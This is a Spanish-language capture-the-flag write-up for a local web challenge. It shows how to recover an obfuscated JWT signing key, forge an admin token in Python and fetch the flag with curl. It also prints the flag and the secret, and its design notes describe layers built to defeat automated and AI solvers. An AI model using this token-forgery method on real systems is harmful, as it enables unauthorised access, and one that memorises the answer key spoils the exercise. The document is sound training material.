# Writeup — Núcleo S.A. (Web, Media)

**Flag:** `FLAG{n0_t0d0_s3_cr4ck34_c0n_r0ckyou}`

Resolución completa paso a paso. La cadena es:
**recon → login demo → leer el secreto de firma (ofuscado) → forjar un JWT de admin → leer la flag.**

---

## 1. Reconocimiento

La landing (`/`) trae una pista en un comentario HTML:

```bash
curl -s http://localhost:5000/ | grep '<!--'
# <!-- NOTA infra: el portal de staging se movió a /portal tras el incidente -->
```

`/robots.txt` lista `/backups/`, `/admin.php` y `/portal`. Los dos primeros son
señuelos (dan 404/403). El que sirve es `/portal`.

## 2. Login con la cuenta de demostración

`/portal` indica que quedó habilitada una cuenta demo `guest:guest`. Al entrar,
el servidor setea una cookie `token` con un JWT:

```bash
curl -s -i -X POST http://localhost:5000/portal \
  -d 'user=guest&password=guest' | grep -i set-cookie
```

Decodificando el payload (parte central del JWT):

```json
{"user": "guest", "role": "user"}
```

Header: `{"alg":"HS256","typ":"JWT"}`. Es HS256 → si conseguimos el secreto,
podemos firmar un token con `role: admin`.

## 3. El secreto de firma (la parte interesante)

### Lo que NO funciona
- `/static/js/app.js` tiene `JWT_SECRET: "dev-secret-123"`. Es la **trampa**:
  firmar con esa clave da **401** (ver §5). Es la carnada para scanners y para
  cualquier solver que agarre lo primero que parezca el secreto.
- Correr `hashcat`/`john` contra el JWT con rockyou **no llega**: el secreto real
  es una frase que no está en wordlists comunes.

### Lo que SÍ funciona
En `/dashboard`, el bloque "Documentación interna" muestra a la vista:

```
JWT signing key (HS256): nucleo-prod-7F3a-llave-2026
```

Pero en el HTML, ese texto está partido en `<span>` con `style="order:N"` y los
spans están **desordenados en el DOM**. Un `curl`/scraper que lee el texto en
orden de DOM obtiene basura:

```bash
curl -s --cookie "token=<JWT_guest>" http://localhost:5000/dashboard \
 | grep -oE '<span style="order:[0-9]+">[^<]*</span>'
# ...orden del DOM: "eaylnoSpi:c-_dr-on_2aesWe7_l2u62JTlHk6-5gngF3)v-i(_0" (ilegible)
```

El navegador aplica `flex` + `order` y lo **renderiza en el orden correcto**, así
que un humano lee la clave de un vistazo. Para recuperarla desde la terminal hay
que reordenar por el atributo `order`:

```bash
curl -s --cookie "token=<JWT_guest>" http://localhost:5000/dashboard \
 | grep -oE '<span style="order:[0-9]+">[^<]*</span>' \
 | python3 -c "
import sys,re
pairs=[]
for l in sys.stdin:
    m=re.search(r'order:(\d+)\">(.*)</span>',l)
    if m: pairs.append((int(m.group(1)), m.group(2)))
print(''.join(c for _,c in sorted(pairs)).replace('&nbsp;',' '))
"
# -> JWT signing key (HS256): nucleo-prod-7F3a-llave-2026
```

**Secreto real:** `nucleo-prod-7F3a-llave-2026`

## 4. Forjar el JWT de administrador

Con el secreto real, firmamos un token `{"user":"guest","role":"admin"}` HS256.
Se puede con `jwt_tool`, con PyJWT o a mano:

```python
import hmac, hashlib, base64, json
def b(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
secret = "nucleo-prod-7F3a-llave-2026"
h = b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
p = b(json.dumps({"user":"guest","role":"admin"},separators=(",",":")).encode())
si = h + "." + p
sig = b(hmac.new(secret.encode(), si.encode(), hashlib.sha256).digest())
print(si + "." + sig)
```

## 5. Leer la flag

`/flag` tiene tres condiciones (gates):

1. **Cabecera `X-Core-Token`** — el `<script>` del dashboard la arma como
   `btoa('nucleo')` → `bnVjbGVv`. Sin ella: **428**. (Rompe el `curl` ciego que
   no leyó el JS.)
2. **Firma válida con el secreto real** — el decoy da **401**.
3. **`role == "admin"`** — con `role:user` da **403**.

Pegando todo:

```bash
curl -s -H "X-Core-Token: bnVjbGVv" \
  --cookie "token=<JWT_admin_forjado>" \
  http://localhost:5000/flag
# -> FLAG{n0_t0d0_s3_cr4ck34_c0n_r0ckyou}
```

### Tabla de comportamiento (verificada)

| Caso                                          | Resultado |
|-----------------------------------------------|-----------|
| Sin `X-Core-Token`                            | 428       |
| Forjado con decoy `dev-secret-123`            | 401       |
| Secreto real pero `role=user`                 | 403       |
| Secreto real + `role=admin` + cabecera        | **200 + FLAG** |

---

## Notas de diseño (por si piden defensa)

**Vulnerabilidad enseñable:** confianza en un JWT firmado con una clave que la
propia app filtra → forja de rol. Es el núcleo clásico y justo de un reto web medio.

**Capas anti-automatización y por qué son justas (no es *guessing*):**

- *Secreto no crackeable por fuerza bruta:* obliga a buscar la fuga en vez de
  tirar `hashcat`. La fuga existe y es legible.
- *Ofuscación con CSS `order`:* el dato está 100% presente y correcto a la vista;
  solo rompe el scraping de texto plano del DOM. Un humano lo lee directo.
- *Secreto DECOY en `app.js`:* desvía a quien automatiza "agarrá el primer secreto
  que veas". El real está en otro lado.
- *Gate de cabecera visible en el fuente:* el mecanismo está a la vista en el
  `<script>`; replicarlo es trivial leyendo el source. No hay nada que adivinar.
- *Errores informativos (428/401/403):* guían al jugador y evitan el *guessing*,
  que el reglamento del curso marca como mala práctica.

**Limitación honesta:** un agente con visión podría leer el secreto desde una
captura de pantalla, salteando la capa CSS. Es intencional no hacerlo "imposible":
el reto debe tener solución y poder defenderse. Las otras capas (decoy, cabecera,
secreto fuera de wordlist) siguen elevando el costo del camino automatizado.

**Camino único:** no hay rutas alternativas no intencionales conocidas. `alg:none`
se rechaza (la verificación exige coincidencia HMAC exacta). No hay login de admin
accesible: el único acceso admin es forjando el token.
